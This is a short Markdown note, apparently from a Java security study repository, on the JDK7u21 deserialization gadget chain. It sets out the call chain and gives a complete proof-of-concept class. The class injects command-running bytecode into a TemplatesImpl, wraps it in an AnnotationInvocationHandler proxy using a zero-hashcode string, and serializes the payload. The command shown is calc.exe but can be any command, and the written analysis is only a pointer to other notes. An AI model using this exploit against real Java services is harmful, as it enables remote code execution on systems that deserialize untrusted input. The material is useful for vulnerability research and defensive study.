# jdk7u21

## Gadget Chain&Requires

```
Gadget Chain:
    LinkedHashSet.readObject()
      LinkedHashSet.add()
        ...
          TemplatesImpl.hashCode() (X)
      LinkedHashSet.add()
        ...
          Proxy(Templates).hashCode() (X)
            AnnotationInvocationHandler.invoke() (X)
              AnnotationInvocationHandler.hashCodeImpl() (X)
                String.hashCode() (0)
                AnnotationInvocationHandler.memberValueHashCode() (X)
                  TemplatesImpl.hashCode() (X)
          Proxy(Templates).equals()
            AnnotationInvocationHandler.invoke()
              AnnotationInvocationHandler.equalsImpl()
                Method.invoke()
                  ...
                    TemplatesImpl.getOutputProperties()
                      TemplatesImpl.newTransformer()
                        TemplatesImpl.getTransletInstance()
                          TemplatesImpl.defineTransletClasses()
                            ClassLoader.defineClass()
                            Class.newInstance()
                              ...
                                MaliciousClass.<clinit>()
                                  ...
                                    Runtime.exec()
Require:
	jdk7u21                               
```

## poc

```java
package com.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesImpl = createTemplatesImpl("calc.exe");

        //magic number
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        // 实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);


        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templatesImpl);
        set.add(proxy);

        // 将恶意templates设置到map中
        map.put(zeroHashCodeStr, templatesImpl);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();


    }
    public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        //修改Neo类，插入command，创建恶意字节码，此处参考ysoserial
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.getCtClass(Neo.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        CtClass superC = pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();

        setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

## analysis

见笔记